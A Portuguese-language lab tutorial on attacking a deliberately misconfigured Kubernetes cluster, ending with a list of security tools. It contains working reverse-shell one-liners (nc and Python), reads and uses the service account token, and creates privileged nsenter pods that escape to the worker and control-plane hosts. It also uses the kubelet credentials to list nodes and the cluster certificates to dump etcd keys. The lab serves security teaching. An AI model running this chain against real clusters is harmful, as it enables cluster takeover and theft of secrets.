# Kubernetes é seguro por default?

# Laboratório + explicação:

Para montar nosso laboratório vamos precisar de um cluster **kubernetes** com no minimo 1 node control plane e 1 node worker.

Caso for criar esse ambiente em alguma cloud se for possível também crie uma maquina  maquina para servir atacante facilitando assim o processo da shell reversa.

**Não executar esse lab em um cluster produtivo ou no cluster no amiguinho =)** 

Vamos começar preparando nosso ambiente criando um namespace, deployment, serviceaccount e roles:

Criando o namespace:
```
kubectl create ns production
```

Criando a service account:
```
kubectl create sa web-app-sa -n production
```

Concedendo permissões para a service account:
```
kubectl create role web-app-role -n production --verb=get,list,create --resource=pods,pods/exec

kubectl create rolebinding binding-role-app --serviceaccount=production:web-app-sa --role=web-app-role -n production
```


Criando o nosso deployment:
```
apiVersion: apps/v1
kind: Deployment
metadata:
  creationTimestamp: null
  labels:
    app: web-app
  name: web-app
  namespace: production
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web-app
  strategy: {}
  template:
    metadata:
      creationTimestamp: null
      labels:
        app: web-app
    spec:
      containers:
      - image: p0ssuidao/vulne-pod-lab:01
        name: vulne-pod-lab
        resources: {}
      serviceAccountName: web-app-sa
 ```

Service:

```
kubectl expose pod -n production web-app --port=8080 --target-port=8080 --type=NodePort --name=web-app-role
```

Verificando tudo o que criamos:
```
kubectl get no -o wide
kubectl get svc -n production 
```

Agora basta acessar nossa aplicação no seu navegador **IP do node + Node port**.

Para autenticar na aplicação vamos usar as seguintes credenciais:
```
User: foo 
Pass: bar
```

Agora vamos abrir a porta 32000 em nossa máquina(Máquina atacante) para receber a conexão:
```
sudo nc  -l 32000
```

No terminal web da aplicação vamos executar nossa shell:

Aqui com 2 exemplos (NC e python)

Bash:
```
nc -e /bin/bash "IP da sua máquina" 32000
```
Python:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.142.0.42",32000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Com o laboratório criado e configurado vamos começar o processo de reconhecimento do ambiente, tentando identificar onde e o que estamos rodando.


Primeiro identificarmos com qual usuário estamos logados:
```
id
```

A aplicação está rodando com o usuário appuser, então vamos ver quais processos estão em execução.
```
ps aux
```

Existe um número muito baixo de processos. Ter poucos processos é o primeiro indicativo que a aplicação é em um container. Por default um container roda com o usuário root mas isso pode ser alterado.

Levantaremos informações sobre o release do S.O.
```
uname -a ; cat /etc/*-release
```

Aqui há informações como a linha da distribuição GNU/Linux e a versão do Kernel. Com isso já pode se iniciar a busca por exploits para a versão de kernel e baseados na distro.Continuando a busca, listaremos as variáveis do ambiente.


```
env
```

Vamos continuar o reconhecimento para termos certeza que estamos rodando em um container. Para isso vamos utilizar a ferramenta “amicontained”, pois com ela conseguimos uma serie de informações como:
- Container Runtime.
- Existência de namespace.
- Capabilities.
- Syscalls liberadas.
```
cd /tmp; curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64" -o "amicontained" \ && chmod a+x "amicontained" \ && ./amicontained
```
Não temos acesso a nenhuma syscall e nenhuma capabilities especial, porém conseguimos confirmar que realmente somos um container.

Todo pod, deploy e rs possui uma serviceaccount e por padrão são executados com a conta default. Uma serviceaccount fornece uma identidade para processos executados em um pod e nela são atrelado as rules de permissão.

O por padrão o token e certificado ficam em um volume montado no pod no diretório **/var/run/secrets/kubernetes.io/serviceaccount**.


```
cd /var/run/secrets/kubernetes.io/serviceaccount
```

Primeiro vamos ver a versão do cluster e se conseguimos interagir com a API.
```
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
```
Já que conseguimos acesso a API com esse token vamos tentar listar alguns pods, de início vamos tentar listar no namespace em que estamos:

```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api --header "Authorization: Bearer $TOKEN" --insecure

curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/$NS/pods/ --header "Authorization: Bearer $TOKEN" --insecure
```

Conseguimos listar os pods e isso é muito interessante. Para facilitar um pouco as coisas vamos baixar o kubectl para interagir com o cluster.

```
cd /tmp ; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl ; chmod +x ./kubectl
```
Listaremos os pods com o kubectl.
```
./kubectl get pod
```

Para testar nossos acessos vamos utilizar o "kubectl auth can-i"
```
./kubectl auth can-i --list
./kubectl auth can-i create pods
```

Agora vamos tentar escalar nosso privilégio criando um pod.

```
cd /tmp; cat > root-shell.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: pod-brabo-devops-extreme
  name: pod-brabo-devops-extreme
spec:
  containers:
  - command:
    - nsenter
    - --mount=/proc/1/ns/mnt
    - --
    - /bin/bash
    image: alpine
    imagePullPolicy: IfNotPresent
    name: "pod-brabo-devops-extreme"
    securityContext:
      privileged: true
    stdin: true
    tty: true
  dnsPolicy: ClusterFirst
  hostPID: true
EOF
./kubectl apply -f root-shell.yml
sleep 10
./kubectl get pods
sleep 10
./kubectl exec -it pod-brabo-devops-extreme -- bash
```

Conseguimos acesso ao host !  

Verificando os acessos: 

```
id

ps aux

docker ps

cat /etc/hostname

```

Nosso acesso é a um worker mas queremos chegar nos master, para isso será necessário informações sobre os demais nodes.

Como vimos, nossa service account não possui permissão para listar os nodes, então vamos procurar uma que consiga listar os nodes.

Lembrando dos componentes que fazem parte dos node o kubelet possui permissão para verificar os nós ativos, vamos tentar utilizar sua configuração de autenticação para listarmos os nodes:
Vamos pegar suas config com:

```
systemctl status kubelet
```
Com a config do kubelet tentaremos listar os nodes usando o parametro --kubeconfig:

```
kubectl get no --kubeconfig=/etc/kubernetes/kubelet.conf
```
**Conseguimos !** 

Agora vamos forçar o scheduler agendar nosso container no control plane.

Mas primeiro precisamos voltar para nosso container com permissão de criação de pods.

```
exit
```

- **Nome do node Master** | Substituir pelo nome do seu nó em yml abaixo.

```
cd /tmp; cat > master-root-shell.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: mega-pod-brabo-devops-extreme
  name: mega-pod-brabo-devops-extreme
spec:
  containers:
  - command:
    - nsenter
    - --mount=/proc/1/ns/mnt
    - --
    - /bin/bash
    image: alpine
    imagePullPolicy: IfNotPresent
    name: "mega-pod-brabo-devops-extreme"
    securityContext:
      privileged: true
    stdin: true
    tty: true
  dnsPolicy: ClusterFirst
  hostPID: true
  nodeName: **Nome do node Master**
  tolerations:
  - effect: NoExecute
    operator: Exists
EOF
./kubectl apply -f master-root-shell.yml
sleep 10
./kubectl get pods
sleep 10
./kubectl exec -it mega-pod-brabo-devops-extreme -- bash
```
Conseguimos acesso ao control plane =)

```
id

ps aux

docker ps

kubectl get no

kubectl auth can-i --list
```
Também vamos pegar o ID do container do etcd e listas os valores armazenados:
ID:
```
docker ps | grep etcd
```
Vamos pegar os certificados:
```
cat /etc/kubernetes/manifests/etcd.yaml
```
Agora vamos listar as chaves:

``` 
docker exec ETCD_ID etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt get / --prefix --keys-only | grep kube-system

``` 
---
# Tools:
- [Kube-Hunter](https://github.com/aquasecurity/kube-hunter)
- [Kube-bench](https://github.com/aquasecurity/kube-bench)
- [Kubesploit](https://github.com/cyberark/kubesploit)
- [Trivy](https://github.com/aquasecurity/trivy)
- [Starboard](https://github.com/aquasecurity/starboard)
- [Kube-scan](https://github.com/octarinesec/kube-scan)
- [Tracee](https://github.com/aquasecurity/tracee)
- [Falco](https://github.com/falcosecurity/falco)
- [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper)
- [Kyverno](https://github.com/kyverno/kyverno)
- [Krave](https://github.com/appvia/krane)
- [Helm-Scanner](https://github.com/bridgecrewio/helm-scanner/)

